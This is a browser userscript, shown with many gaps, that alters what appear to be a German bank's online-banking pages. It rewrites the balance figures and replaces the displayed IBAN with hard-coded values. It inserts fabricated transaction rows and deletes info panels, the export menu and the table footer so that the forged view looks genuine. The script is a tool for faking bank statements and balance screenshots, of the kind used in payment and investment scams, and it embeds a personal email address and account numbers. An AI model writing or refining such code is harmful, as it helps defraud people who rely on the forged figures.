// ==UserScript==
// @name         Ed 4Rec  comz.wolfgangbuchholz5@gmail.com
...
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/533702/Ed%204Rec%20%20comzwolfgangbuchholz5%40gmailcom.user.js
// @updateURL https://update.greasyfork.org/scripts/533702/Ed%204Rec%20%20comzwolfgangbuchholz5%40gmailcom.meta.js
// ==/UserScript==
...
//3 and COMM UMSATZE BALANCE MODIF and 8 COMM KONTODETAILS
  ...
  //6 COMM TRANSACTIONOVERVIEW BAL CHANGE
    ...
    var balanceChange = 1  ; // Specify the amount to increase or decrease the main balance   DONT'T CHANGE IT!!!
...
//    const specifiedTextContent = "434 DE54 2004 0000 0275 6245 00"; // Specified text content
...
///IBAN CONFIGURATION_______________________________________________________
     ...
     specifiedTextContent = targetTextContent = "DE92 7004 0048 0839 9826 00"
...
///////////////////////////////////////////////////////////////////////////////
//1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL  NEW
///////////////////////////////////////////////////////////////////////////////
//1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL  NEW
///////////////////////////////////////////////////////////////////////////////
//1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL   NEW
...
if (window.location.href.indexOf("startpage") > 0 || window.location.href.indexOf("Downloads") > 0 || window.location.href.indexOf("10733875328") > 0) {
    ...
    function modifyBalance() {
        // Check for the presence of the element with the updated class
        const csvElement = document.querySelector('.lsgs-e286f--subline.lsgs-e286f--subline__hyphens-manual.lsgs-e286f--subline-container.lsgs-e286f--subline-container__align-left') &&
                           document.querySelector('.ucc-sp-amount.lsgs-e286f--copy-text');
        if (csvElement) {
            // Find all elements containing the "€" sign in their text content
            const balanceElements = document.querySelectorAll('.ucc-sp-amount.lsgs-e286f--copy-text');
            homeBALANCE_CONFIGS.forEach(config => {
                ...
                if (balanceElement && balanceElement.textContent.includes('EUR')) {
                    ...
                    if (!isNaN(balanceValue)) {
                        ...
                        setTimeout(() => {
                            const elementToRemove = document.querySelector('.lsgs-e286f--subline.lsgs-e286f--subline__hyphens-manual.lsgs-e286f--subline-container.lsgs-e286f--subline-container__align-left');
                            if (elementToRemove) {
                                elementToRemove.remove();
                                console.log("Element with class '.lsgs-e286f--subline.lsgs-e286f--subline__hyphens-manual.lsgs-e286f--subline-container.lsgs-e286f--subline-container__align-left' removed.");
                            }
                        }, 5);
                    } else {
    ...
    // Function to remove elements with the updated class
    function removeInfoTextElements() {
        const elementsToRemove = document.querySelectorAll('.margin-right.lsgs-e286f--grid-column.lsgs-e286f--grid-column__md-col-6.lsgs-e286f--grid-column__sm-col-6.lsgs-e286f--grid-column__xs-col-4.lsgs-e286f--grid-column__align-left');
        elementsToRemove.forEach(element => {
            element.remove();
            console.log("Element with class '.margin-right.lsgs-e286f--grid-column.lsgs-e286f--grid-column__md-col-6.lsgs-e286f--grid-column__sm-col-6.lsgs-e286f--grid-column__xs-col-4.lsgs-e286f--grid-column__align-left' removed.");
        });
    }
    ...
    // Call the function to remove the updated class every 50 milliseconds
...
///////////////////////////////////////////////////////////////////////////////
//2 COMM FINSISCHT CHANGE BAL      NEW
///////////////////////////////////////////////////////////////////////////////
//2 COMM FINSISCHT CHANGE BAL       NEW
///////////////////////////////////////////////////////////////////////////////
//2 COMM FINSISCHT CHANGE BAL       NEW
...
const presenceCheckElement = document.querySelector('.lsgs-e6c27--overline.lsgs-e6c27--overline-large.lsgs-e6c27--overline-container') && document.querySelector('.lsgs-e6c27--h3');
        if (presenceCheckElement) {
            ...
            gesamtfinanzaccountBalanceAdjustments.forEach(({ index, amount }) => {
                ...
                const balanceElements = document.querySelectorAll('.lsgs-e6c27--h3');
          ...
          setTimeout(() => {
                ...
                const elementsToRemove = document.querySelectorAll('.lsgs-e6c27--overline.lsgs-e6c27--overline-large.lsgs-e6c27--overline-container');

                // querySelectorAll returns a NodeList, so we need to iterate over it
                elementsToRemove.forEach(element => {
                    element.remove();
                    console.log("Element with class '.lsgs-e6c27--overline.lsgs-e6c27--overline-large.lsgs-e6c27--overline-container");
                });
            }, 5);
        } else {
...
//        // Add more configurations as needed...
 //   ];
    ...
    function modifyBalance() {
        ...
        const csvElement = document.querySelector('.PersonalizedBalance-module_infoPanel__ftubm') && document.querySelector('.lsgs-e6c27--two-line-item__label-text.lsgs-e6c27--two-line-item__label-text--centered');
        if (csvElement) {
            // Find all elements containing the "€" sign in their text content
            const balanceElements =  document.querySelectorAll('.lsgs-e6c27--two-line-item__label-text.lsgs-e6c27--two-line-item__label-text--centered');
...
function removeSpecificElement() {
    ...
    const firstElementToRemove = document.querySelector('.ActionBar-module_exportMenu__k4QT0.lsgs-e6c27--grid-column.lsgs-e6c27--grid-column__md-col-2.lsgs-e6c27--grid-column__sm-col-2.lsgs-e6c27--grid-column__xs-col-2.lsgs-e6c27--grid-column__align-right');
    ...
    const secondElementToRemove = document.querySelector('.ProductTable-module_tableFooter__WoCJQ');
    if (secondElementToRemove) {
        secondElementToRemove.remove();
        console.log("Element with class '.ProductTable-module_tableFooter__WoCJQ' removed.");
    }
}
...
///////////////////////////////////////////////////////////////////////////////
//6 COMM TRANSACTIONOVERVIEW BAL CHANGE    NEW
///////////////////////////////////////////////////////////////////////////////
//6 COMM TRANSACTIONOVERVIEW BAL CHANGE   NEW
///////////////////////////////////////////////////////////////////////////////
//6 COMM TRANSACTIONOVERVIEW BAL CHANGE   NEW
...
var balanceHeader = document.querySelector('.BalanceOverview-module_balanceInfo__b-asC h4.lsgs-e6c27--h4');

// Check if the target element is found
if (balanceHeader) {
  // Get the current balance value
  var balanceText = balanceHeader.childNodes[2].textContent.trim();
  ...
  if (!isNaN(currentBalance)) {
    ...
    balanceHeader.childNodes[2].textContent = ' ' + newBalance.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' EUR';
...
transactionsnew.forEach(function (transactionConfig, index) {
    ...
    dateParagraph.className = 'lsgs-e6c27--helper-text';
    ...
    ['name', 'details', 'type', 'amount'].forEach(function (field) {
        ...
        if (field === 'amount') {
            ...
            paragraph.className = isPositive ?
                'TransactionRow-module_transactionRow__positiveAmount__0JFuZ lsgs-e6c27--info-text' :
                'undefined lsgs-e6c27--info-text';
        } else {
            paragraph.className = 'lsgs-e6c27--info-text';
        }
